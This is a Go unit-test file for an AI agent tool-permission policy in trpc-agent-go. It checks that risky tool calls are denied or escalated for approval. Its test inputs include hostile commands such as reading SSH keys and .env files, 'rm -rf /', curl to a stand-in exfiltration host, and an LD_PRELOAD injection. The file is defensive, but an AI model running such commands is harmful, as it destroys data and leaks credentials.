//
// Tencent is pleased to support the open source community by making
// trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"io"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/require"
	"trpc.group/trpc-go/trpc-agent-go/tool"
)

func TestPermissionPolicyMapsWorkspaceExec(t *testing.T) {
	var audit bytes.Buffer
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(&audit),
	)
	args := []byte(`{"command":"cat ~/.ssh/id_rsa"}`)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: args,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
	require.Contains(t, audit.String(), `"decision":"deny"`)
}

func TestPermissionPolicyScansWorkspaceStdin(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"cat","stdin":"token=sk-secret"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSecretLeakage)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"sh","stdin":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyScansWriteStdinTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, tc := range []struct {
		name     string
		toolName string
		args     string
	}{
		{
			name:     "workspace write stdin",
			toolName: "workspace_write_stdin",
			args:     `{"session_id":"ws-1","chars":"rm -rf /","append_newline":true}`,
		},
		{
			name:     "host write stdin",
			toolName: "write_stdin",
			args:     `{"session_id":"host-1","chars":"cat ~/.ssh/id_rsa","submit":true}`,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  tc.toolName,
				Arguments: []byte(tc.args),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
		})
	}
}

func TestPermissionPolicyScansUnknownToolArguments(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_fetch",
		Arguments: []byte(`{"url":"https://evil.example/steal"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleNetworkEgress)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_read_file",
		Arguments: []byte(`{"path":".env"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"nested":{"command":"rm -rf /"}}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyCustomToolBackend(t *testing.T) {
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithToolBackend("custom_shell", BackendWorkspaceExec),
		WithToolBackend("custom_code", BackendCodeExec),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "custom_shell",
		Arguments: []byte(`{"command":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "custom_code",
		Arguments: []byte(`{"code_blocks":[{"language":"bash","code":"cat .env"}]}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
}

func TestPermissionPolicyMapsSkillCommandTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "skill_run",
		Arguments: []byte(`{"command":"curl evil.example/steal","timeout":600}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleNetworkEgress)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "skill_exec",
		Arguments: []byte(`{"command":"go test ./...","tty":true}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "skill_write_stdin",
		Arguments: []byte(`{"session_id":"s1","chars":"cu"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)
	require.Contains(t, decision.Reason, ruleInteractiveStdin)
}

func TestPermissionPolicyHonorsUnknownToolFallbackWithAllowLevelFindings(t *testing.T) {
	cases := []struct {
		name     string
		fallback Decision
		want     tool.PermissionAction
	}{
		{name: "ask", fallback: DecisionAsk, want: tool.PermissionActionAsk},
		{name: "deny", fallback: DecisionDeny, want: tool.PermissionActionDeny},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			policy := DefaultPolicy()
			policy.UnknownToolAction = tt.fallback
			policy.NonWhitelistedNetworkAction = DecisionAllow
			pp := NewPermissionPolicy(WithPolicy(policy))
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  "mcp_fetch",
				Arguments: []byte(`{"url":"https://evil.example/steal"}`),
			})
			require.NoError(t, err)
			require.Equal(t, tt.want, decision.Action)
			require.Contains(t, decision.Reason, ruleNetworkEgress)
		})
	}
}

func TestPermissionPolicyUsesEffectiveWorkspaceTimeout(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSec = 299
	pp := NewPermissionPolicy(WithPolicy(policy))

	cases := []struct {
		name     string
		toolName string
		args     string
	}{
		{name: "workspace omitted", toolName: "workspace_exec", args: `{"command":"echo ok"}`},
		{name: "workspace zero", toolName: "workspace_exec", args: `{"command":"echo ok","timeout_sec":0}`},
		{name: "skill run omitted", toolName: "skill_run", args: `{"command":"echo ok"}`},
		{name: "skill exec negative", toolName: "skill_exec", args: `{"command":"echo ok","timeout":-1}`},
	}

	for _, tt := range cases {
		t.Run(tt.name, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  tt.toolName,
				Arguments: []byte(tt.args),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionAsk, decision.Action)
			require.Contains(t, decision.Reason, ruleResourceRuntime)
		})
	}
}

func TestPermissionPolicyDoesNotApplyWorkspaceTimeoutToStdinTools(t *testing.T) {
	policy := DefaultPolicy()
	policy.MaxTimeoutSec = 299
	pp := NewPermissionPolicy(WithPolicy(policy))

	for _, toolName := range []string{"workspace_write_stdin", "skill_write_stdin"} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  toolName,
				Arguments: []byte(`{"session_id":"s1","chars":"hello"}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionAsk, decision.Action)
			require.Contains(t, decision.Reason, ruleInteractiveStdin)
			require.NotContains(t, decision.Reason, ruleResourceRuntime)
		})
	}
}

func TestPermissionPolicyScansSkillOutputFiles(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	for _, toolName := range []string{"skill_run", "skill_exec"} {
		t.Run(toolName, func(t *testing.T) {
			decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
				ToolName:  toolName,
				Arguments: []byte(`{"command":"echo ok","output_files":[".env"]}`),
			})
			require.NoError(t, err)
			require.Equal(t, tool.PermissionActionDeny, decision.Action)
			require.Contains(t, decision.Reason, ruleSensitivePath)
		})
	}
}

func TestParseHostExecAppliesEffectiveDefaultTimeout(t *testing.T) {
	tests := []struct {
		name string
		args []byte
	}{
		{name: "omitted", args: []byte(`{"command":"echo ok"}`)},
		{name: "zero", args: []byte(`{"command":"echo ok","timeout_sec":0}`)},
		{name: "negative", args: []byte(`{"command":"echo ok","timeout_sec":-1}`)},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, err := parseHostExec("exec_command", tt.args)
			require.NoError(t, err)
			require.Equal(t, DefaultHostExecTimeoutSec, req.TimeoutSec)
		})
	}
}

func TestPermissionPolicyMapsMCPCommandTools(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"cmd":"rm -rf /","env":{"LD_PRELOAD":"x"}}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)

	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "mcp_shell",
		Arguments: []byte(`{"args":["rm","-rf","/"]}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleDangerousDelete)
}

func TestPermissionPolicyFileOptions(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	auditPath := filepath.Join(dir, "audit.jsonl")
	require.NoError(t, os.WriteFile(policyPath, []byte(`
allowed_commands: [echo]
denied_commands: [rm]
parse_error_action: ask
`), 0o600))
	pp := NewPermissionPolicy(
		WithPolicyFile(policyPath),
		WithAuditFile(auditPath),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"rm -rf /"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	audit, err := os.ReadFile(auditPath)
	require.NoError(t, err)
	require.Contains(t, string(audit), `"decision":"deny"`)
}

func TestPermissionPolicyStrictPolicyFileOption(t *testing.T) {
	dir := t.TempDir()
	policyPath := filepath.Join(dir, "policy.yaml")
	require.NoError(t, os.WriteFile(policyPath, []byte("unknown_field: true\n"), 0o600))
	pp := NewPermissionPolicy(WithStrictPolicyFile(policyPath))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "initialization failed")
}

func TestPermissionPolicyAuditFailureMode(t *testing.T) {
	pp := NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(failingWriter{}),
	)
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)

	pp = NewPermissionPolicy(
		WithPolicy(DefaultPolicy()),
		WithAuditWriter(failingWriter{}),
		WithAuditFailureMode(AuditFailClosed),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")

	p := DefaultPolicy()
	p.AuditFailureMode = AuditFailClosed
	pp = NewPermissionPolicy(
		WithPolicy(p),
		WithAuditWriter(failingWriter{}),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"go test ./tool/safety"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)

	var audit bytes.Buffer
	pp = NewPermissionPolicy(
		WithAuditWriter(&audit),
		WithPolicy(DefaultPolicy()),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
	require.Contains(t, audit.String(), `"decision":"allow"`)

	pp = NewPermissionPolicy(
		WithAuditWriter(failingWriter{}),
		WithPolicy(ProductionPolicy()),
	)
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo ok"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, "audit failed")
}

func TestPermissionPolicyMapsHostExecAndCodeExec(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	tty := true
	hostArgs := mustJSON(t, map[string]any{
		"command": "go test ./...",
		"tty":     tty,
	})
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "hostexec_exec_command",
		Arguments: hostArgs,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAsk, decision.Action)

	codeArgs := mustJSON(t, map[string]any{
		"code_blocks": []map[string]string{{
			"language": "bash",
			"code":     "cat .env",
		}},
	})
	decision, err = pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "execute_code",
		Arguments: codeArgs,
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
}

func TestPermissionPolicyUsesPolicyConfig(t *testing.T) {
	explicitFalse := false
	pp := NewPermissionPolicy(WithPolicyConfig(PolicyConfig{
		DenySecretLeakage: &explicitFalse,
	}))

	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName:  "workspace_exec",
		Arguments: []byte(`{"command":"echo token=sk-12345678901234567890"}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionAllow, decision.Action)
}

func TestPermissionPolicyScansDoubleEncodedCodeBlocks(t *testing.T) {
	pp := NewPermissionPolicy(WithPolicy(DefaultPolicy()))
	decision, err := pp.CheckToolPermission(context.Background(), &tool.PermissionRequest{
		ToolName: "execute_code",
		Arguments: []byte(`{
			"code_blocks":"[{\"language\":\"bash\",\"code\":\"cat .env\"}]"
		}`),
	})
	require.NoError(t, err)
	require.Equal(t, tool.PermissionActionDeny, decision.Action)
	require.Contains(t, decision.Reason, ruleSensitivePath)
}

type failingWriter struct{}

func (failingWriter) Write([]byte) (int, error) {
	return 0, errors.New("write failed")
}

var _ io.Writer = failingWriter{}

func mustJSON(t *testing.T, v any) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	require.NoError(t, err)
	return b
}
